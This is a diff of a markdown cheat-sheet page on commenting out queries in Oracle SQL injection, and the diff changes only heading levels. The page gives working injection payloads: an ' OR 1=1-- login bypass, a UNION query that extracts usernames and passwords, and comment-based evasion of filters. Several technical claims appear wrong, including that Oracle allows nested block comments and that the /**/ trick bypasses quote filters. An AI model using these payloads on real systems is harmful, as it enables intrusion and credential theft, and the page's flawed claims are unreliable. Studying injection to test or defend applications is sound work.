@@ -7,11 +7,9 @@ tags: ["basics", "syntax", "comments"]
 lastUpdated: 2025-03-15
 ---
 
-## Comment Out Query
-
 When performing SQL injection attacks against Oracle databases, commenting out the remainder of a query is often necessary to ensure that the injection payload works correctly without syntax errors. Oracle provides specific syntaxes for commenting.
 
-### Oracle Comment Syntax
+## Oracle Comment Syntax
 
 Oracle supports two primary methods for commenting out query parts:
 
@@ -20,7 +18,7 @@ Oracle supports two primary methods for commenting out query parts:
 | Single-line comment | `--`        | Comments out everything to the end of the line |
 | Block comment       | `/* ... */` | Can span multiple lines                        |
 
-### Single-Line Comments
+## Single-Line Comments
 
 The double dash `--` is the most common way to comment out the rest of a query in Oracle:
 
@@ -41,7 +39,7 @@ SELECT * FROM users WHERE username = 'admin'--  AND password = 'test'
 SELECT * FROM users WHERE username = 'admin'--AND password = 'test'
 ```
 
-### Block Comments
+## Block Comments
 
 Block comments start with `/*` and end with `*/`:
 
@@ -55,9 +53,9 @@ Block comments are useful when you need to comment out code in the middle of a s
 SELECT user_id, username /* , password */ FROM users
 ```
 
-### Examples in SQL Injection Context
+## Examples in SQL Injection Context
 
-#### Login Bypass
+### Login Bypass
 
 ```sql
 -- Original query:
@@ -70,7 +68,7 @@ SELECT * FROM users WHERE username = 'input1' AND password = 'input2'
 SELECT * FROM users WHERE username = '' OR 1=1--  ' AND password = 'input2'
 ```
 
-#### UNION Attack
+### UNION Attack
 
 ```sql
 -- Original query:
@@ -83,7 +81,7 @@ SELECT article_id, title, content FROM articles WHERE article_id = 'input'
 SELECT article_id, title, content FROM articles WHERE article_id = -1 UNION SELECT username, password, null FROM users--
 ```
 
-### Oracle-Specific Notes
+## Oracle-Specific Notes
 
 Unlike some other database systems, Oracle:
 
@@ -92,9 +90,9 @@ Unlike some other database systems, Oracle:
 3. Does not support the MySQL-style `-- -` comment syntax
 4. Allows nested block comments `/* outer /* inner */ outer */`
 
-### Practical Applications
+## Practical Applications
 
-#### Terminating Complex Queries
+### Terminating Complex Queries
 
 For complex queries with multiple conditions, commenting is essential:
 
@@ -109,7 +107,7 @@ SELECT * FROM products WHERE category_id = 'input' AND active = 1 AND price > 0
 SELECT * FROM products WHERE category_id = '' OR 1=1--  ' AND active = 1 AND price > 0
 ```
 
-#### Bypassing Quote Filters
+### Bypassing Quote Filters
 
 If single quotes are filtered, you might be able to use comment handling:
 
@@ -118,7 +116,7 @@ If single quotes are filtered, you might be able to use comment handling:
 SELECT/**/username/**/FROM/**/users/**/WHERE/**/user_id=1--
 ```
 
-#### Multi-Line Statement Handling
+### Multi-Line Statement Handling
 
 Oracle's PL/SQL blocks can be complicated, and sometimes you need block comments:
 
